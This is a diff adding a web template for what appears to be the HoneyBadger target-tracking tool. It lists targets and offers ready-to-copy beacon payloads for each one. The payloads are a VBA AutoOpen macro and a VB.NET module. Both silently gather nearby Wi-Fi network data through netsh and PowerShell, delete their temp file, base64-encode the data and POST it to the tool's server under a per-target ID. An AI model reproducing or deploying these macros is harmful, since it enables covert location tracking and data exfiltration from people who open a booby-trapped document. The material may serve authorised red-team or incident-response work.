@@ -1,0 +1,120 @@
+{% extends "layout.html" %}
+{% block body %}
+    <br/>
+    {% if g.user.is_admin %}
+    <div class="row">
+        <div class="six columns offset-by-three center-content">
+            <form action="{{ url_for('target_add') }}" method="post">
+                <input style="vertical-align: middle" name="target" type="text" placeholder="target name" />
+                <input style="vertical-align: middle" type="submit" value="add" onclick="this.form.submit();" />
+            </form>
+        </div>
+    </div>
+    {% endif %}
+    <div class="row">
+        <div class="u-full-width center-content targets">
+        <script>
+            function copy_vb(type, target_guid) {
+                message = "";
+                if(type == "VBA") {
+                    message = "The macro should be copied to the clipboard.\n\nIf not, simply copy and paste this into your document:\n\n";
+                } else if(type == "VB.NET") {
+                    message = "The VB.NET code should be copied to the clipboard.\n\nIf not, simply copy and paste this into your VB.NET file:\n\n";
+                } else {
+                    console.warn("ERROR: Invalid agent type specified: " + type);
+                    return 1;
+                }
+
+                alert(message + document.getElementById(target_guid).innerText);
+
+                copyText = document.getElementById(target_guid).textContent;
+                textArea = document.createElement('textarea');
+                textArea.setAttribute("id", "temptext");
+                textArea.textContent = copyText;
+                document.body.append(textArea);
+                textArea.select();
+                document.execCommand("copy");
+                document.getElementById('temptext').remove();
+            }
+        </script>
+        {% if targets|length > 0 %}
+            <table class="sortable center">
+                <thead>
+                    <tr>
+                    {% for column in columns %}
+                        <th>{{ column }}</th>
+                    {% endfor %}
+                        <th>action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                {% for target in targets %}
+                    <tr>
+                    {% for column in columns %}
+                        <td>{{ target[column] }}</td>
+                    {% endfor %}
+                        <td>
+                            <pre hidden id="macro_{{ target.guid }}"><code>Sub AutoOpen()
+    Set objWSH = CreateObject("WScript.Shell")
+    wifi = objWSH.Exec("powershell netsh wlan show networks mode=bssid | findstr 'SSID Signal Channel'").StdOut.ReadAll
+
+    Open Environ("temp") & "\wifidat.txt" For Output As #1
+        Print #1, wifi
+    Close #1
+
+    wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
+
+    Kill Environ("temp") & "\wifidat.txt"
+
+    wifienc = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
+
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+    objHTTP.Open "POST", "{{ request.url_root }}api/beacon/{{ target.guid }}/VBA"
+    objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    objHTTP.Send "os=windows&data=" & wifienc
+End Sub</code></pre>
+                            <pre hidden id="vb_{{ target.guid }}"><code>Imports System.IO
+
+Module HoneyBadgerBeacon
+    Sub Main()
+        Dim objWSH As New Object
+        objWSH = CreateObject("WScript.Shell")
+
+        Dim wifi As String
+        wifi = objWSH.Exec("powershell netsh wlan show networks mode=bssid | findstr 'SSID Signal Channel'").StdOut.ReadAll
+
+        Dim objWriter As New System.IO.StreamWriter(Environ("temp") & "\wifidat.txt")
+        objWriter.Write(wifi)
+        objWriter.Close()
+
+        wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
+
+        Kill(Environ("temp") & "\wifidat.txt")
+
+        wifi = objWSH.Exec("powershell -Command ""& {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" & wifi & "'))}""").StdOut.ReadAll
+
+        Dim objHTTP As New Object
+        objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+        objHTTP.Open("POST", "{{ request.url_root }}api/beacon/{{ target.guid }}/VB")
+        objHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+        objHTTP.Send("os=windows&data=" & wifi)
+    End Sub
+End Module</code></pre>
+
+                            <input type="button" onclick="copy_vb('VBA', 'macro_{{ target.guid }}')" value="macro"/>
+                            <input type="button" onclick="copy_vb('VB.NET', 'vb_{{ target.guid }}')" value="VB.NET"/>
+                            <input type="button" onclick="window.open('{{ url_for('demo', guid=target.guid) }}', '_blank')" value="demo" />
+                        {% if g.user.is_admin %}
+                            <input type="button" onclick="if (confirm('Are you sure you want to delete this target and all of its beacons?')) { window.location='{{ url_for('target_delete', guid=target.guid) }}' }" value="delete" />
+                        {% endif %}
+                        </td>
+                    </tr>
+                {% endfor %}
+                </tbody>
+            </table>
+        {% else %}
+            <h5>No targets.</h5>
+        {% endif %}
+        </div>
+    </div>
+{% endblock %}
